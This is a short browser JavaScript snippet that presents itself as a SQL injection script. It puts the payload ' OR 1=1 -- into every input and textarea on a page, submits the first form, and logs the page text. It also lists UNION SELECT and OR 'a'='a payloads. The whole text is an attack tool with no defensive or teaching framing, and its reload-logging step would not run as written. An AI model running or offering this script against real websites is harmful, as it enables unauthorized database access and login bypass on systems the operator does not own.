(function () {
  console.log("SQL Injection script running...");

  const sqlPayloads = [
    "' OR 1=1 --",
    "' UNION SELECT NULL, NULL --",
    "' OR 'a'='a"
  ];

  const formInputs = document.querySelectorAll('input, textarea');

  formInputs.forEach(input => {
    input.value = sqlPayloads[0]; // Insert the payload
    console.log(`Injected payload into input: ${input.name || input.id || 'unnamed input'}`);
  });

  const form = document.querySelector('form');
  if (form) {
    form.submit(); // Submit the form
  }

  // When the page reloads, log the visible text content
  window.addEventListener('load', () => {
    console.log("Page reloaded. Extracting visible text...");
    console.log(document.body.innerText); // Log full page text
  });
})();